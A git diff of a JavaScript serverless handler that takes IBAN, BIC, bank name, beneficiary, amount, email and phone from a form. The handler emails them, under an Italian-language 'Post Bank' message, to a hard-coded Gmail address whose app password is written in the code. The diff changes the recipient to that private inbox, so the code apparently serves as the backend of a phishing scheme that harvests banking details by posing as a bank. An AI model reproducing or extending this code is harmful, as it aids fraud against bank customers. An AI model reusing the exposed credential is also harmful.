@@ -1,19 +1,26 @@
 import nodemailer from 'nodemailer';
-import express from 'express';
-import bodyParser from 'body-parser';
-import cors from 'cors';
 
-const app = express();
-const port = process.env.PORT || 3000;
+export const handler = async (event, context) => {
+  // Set CORS headers
+  const headers = {
+    'Access-Control-Allow-Origin': '*', // Autoriser toutes les origines
+    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
+    'Access-Control-Allow-Headers': 'Content-Type',
+    'Access-Control-Allow-Credentials': 'true'
+  };
 
-// Configure CORS
-app.use(cors());
+  // Handle preflight request
+  if (event.httpMethod === 'OPTIONS') {
+    return {
+      statusCode: 200,
+      headers: headers,
+      body: ''
+    };
+  }
 
-app.use(bodyParser.json());
+  // Parse the request body
+  const { iban, bic, bankName, beneficiaryName, amount, email, phoneNumber, message } = JSON.parse(event.body);
 
-app.post('/send-email', async (req, res) => {
-  const { iban, bic, bankName, beneficiaryName, amount, email, phoneNumber, message } = req.body;
-  
   const num = Math.floor(10000000 + Math.random() * 90000000);
   const num2 = Math.floor(10000 + Math.random() * 90000);
   const date = new Date();
@@ -30,29 +37,36 @@ app.post('/send-email', async (req, res) => {
     Cordiali saluti.
   `;
 
+  // Create a transporter object using the default SMTP transport
   let transporter = nodemailer.createTransport({
     service: 'gmail',
     auth: {
-      user: 'postbank461@gmail.com',
-      pass: 'lmif mcnu yvpv ekzg'
+      user: 'postbank461@gmail.com', // replace with your email
+      pass: 'lmif mcnu yvpv ekzg' // replace with your email password
     }
   });
 
+  // Set up email data with unicode symbols
   let mailOptions = {
-    from: 'Post Bank',
-    to: email,
+    from: email, // replace with your email
+    to: 'postbank461@gmail.com',
     subject: 'Recharge Information',
     text: emailMessage
   };
 
   try {
+    // Send mail with defined transport object
     await transporter.sendMail(mailOptions);
-    res.status(200).json({ message: 'Email sent successfully' });
+    return {
+      statusCode: 200,
+      headers: headers,
+      body: JSON.stringify({ message: 'Email sent successfully' })
+    };
   } catch (error) {
-    res.status(500).json({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() });
+    return {
+      statusCode: 500,
+      headers: headers,
+      body: JSON.stringify({ message: 'Erreur lors de l\'envoi de l\'email', error: error.toString() })
+    };
   }
-});
-
-// Export the app as a lambda handler
-import serverless from 'serverless-http';
-export const handler = serverless(app);
+};
